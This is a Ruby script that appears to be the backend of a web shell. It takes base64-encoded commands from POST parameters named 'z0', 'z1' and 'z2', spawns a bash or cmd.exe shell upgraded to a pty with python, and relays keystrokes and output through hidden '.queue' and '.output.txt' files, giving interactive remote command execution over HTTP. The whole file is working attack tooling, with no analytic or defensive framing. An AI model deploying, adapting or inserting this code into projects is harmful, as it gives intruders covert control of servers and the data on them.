# $_POST: global variable used by the Ruby loader

require 'json'
require 'base64'
require 'fileutils'

work_dir = Dir.pwd
queue_dir = File.join(work_dir, '.queue')
out_file = File.join(work_dir, '.output.txt')
pid_file = File.join(work_dir, '.pid.txt')

FileUtils.mkdir_p(queue_dir) unless Dir.exist?(queue_dir)

def get_safe_str(str)
  str.encode('UTF-8', invalid: :replace, undef: :replace, replace: '') rescue str
end

def finish_http_request
  $stdout.flush
end

type = $_POST['z0'] ? $_POST['z0'].unpack1('m') : nil
z1 = $_POST['z1'] ? $_POST['z1'].unpack1('m') : nil

result = { "status" => "fail", "msg" => "" }

if type == "create"
  Dir.glob(File.join(queue_dir, '*.txt')).each { |f| File.delete(f) rescue nil }
  File.write(out_file, '')
  File.write(pid_file, 'running')

  is_windows = Gem.win_platform?
  shell = z1 ? z1 : (is_windows ? "cmd.exe" : "/bin/bash")

  begin
    if is_windows
      pipe = IO.popen(shell, "r+")
    else
      pipe = IO.popen(shell, "r+")
      python_cmd = "python3 -c 'import pty; pty.spawn(\"#{shell}\")'\n"
      pipe.write("which python3 >/dev/null 2>&1 && exec #{python_cmd} || exec python -c 'import pty; pty.spawn(\"#{shell}\")'\n")
      pipe.flush
    end

    if pipe.nil?
      raise "Engine process creation returned nil."
    end

  rescue => e
    result["msg"] = [ "Failed to initialize process engine: #{e.message}" ].pack('m0')
    print result.to_json
    exit(1)
  end

  result["status"] = "success"
  result["msg"] = "Engine spawned in background execution state."
  print result.to_json
  finish_http_request

  idle = 0
  
  output_thread = Thread.new do
    loop do
      break if !File.exist?(pid_file) || File.read(pid_file).strip != 'running'
      
      begin
        if IO.select([pipe], nil, nil, 0.05)
          chunk = pipe.read_nonblock(10240)
          if chunk && !chunk.empty?
            safe_chunk = get_safe_str(chunk)
            File.open(out_file, 'a') do |f|
              f.flock(File::LOCK_EX)
              f.write(safe_chunk)
            end
          end
        end
      rescue IO::WaitReadable, EOFError
        sleep 0.02
      rescue => e
        break
      end
    end
  end

  while idle < 1000000
    if !File.exist?(pid_file) || File.read(pid_file).strip != 'running'
      break
    end

    files = Dir.glob(File.join(queue_dir, '*.txt')).sort
    if !files.empty?
      idle = 0
      files.each do |file|
        write_buffer = File.read(file) rescue nil
        File.delete(file) rescue nil

        if write_buffer && !write_buffer.empty?
          begin
            pipe.write(write_buffer)
            pipe.flush
          rescue
            break
          end
        end
      end
    else
      idle += 1
    end

    resize_file = File.join(work_dir, '.resize.txt')
    if File.exist?(resize_file)
      resize_data = File.read(resize_file).strip.split(':')
      File.delete(resize_file) rescue nil
      if resize_data.size == 2
        rows, cols = resize_data[0].to_i, resize_data[1].to_i
        system("stty rows #{rows} cols #{cols} 2>/dev/null") unless is_windows
      end
    end

    if pipe.closed?
      break
    end
    
    sleep 0.015
  end

  File.delete(pid_file) rescue nil
  pipe.close rescue nil
  output_thread.kill rescue nil

elsif type == "write"
  raw_bytes = z1 ? (z1.unpack1('m') rescue z1) : ""
  
  timestamp = sprintf("%015.4f", Time.now.to_f)
  chunk_file = File.join(queue_dir, "#{timestamp}_#{rand(1000..9999)}.txt")
  
  File.open(chunk_file, 'wb') do |f|
    f.flock(File::LOCK_EX)
    f.write(raw_bytes)
  end

  result["status"] = "success"
  result["msg"] = "Input buffer queued."
  print result.to_json

elsif type == "read"
  read_content = ""
  
  if File.exist?(out_file) && File.size(out_file) > 0
    File.open(out_file, 'r+') do |f|
      if f.flock(File::LOCK_EX)
        read_content = f.read
        f.truncate(0)
        f.flush
      end
    end
  end

  result["status"] = "success"
  result["msg"] = [read_content].pack('m0')
  print result.to_json

elsif type == "resize"
  cols = $_POST['z1'] ? $_POST['z1'].unpack1('m').to_i : 0
  rows = $_POST['z2'] ? $_POST['z2'].unpack1('m').to_i : 0

  if cols <= 0 || rows <= 0
    result['status'] = 'error'
    result['msg'] = ["Invalid dimensions."].pack('m0')
    print result.to_json
    exit
  end

  if Gem.win_platform?
    cmd = "mode con: cols=#{cols} lines=#{rows} && cls\r\n"
    timestamp = sprintf("%015.4f", Time.now.to_f)
    chunk_file = File.join(queue_dir, "#{timestamp}_#{rand(1000..9999)}.txt")
    File.write(chunk_file, cmd)
  else
    File.write(File.join(work_dir, '.resize.txt'), "#{rows}:#{cols}")
  end

  result['status'] = 'success'
  result['msg'] = ["Dimensions are updated"].pack('m0')
  print result.to_json

elsif type == "stop"
  File.write(pid_file, 'stopped')
  result["status"] = "stop"
  result["msg"] = ["Engine shutdown initiated."].pack('m0')
  print result.to_json
end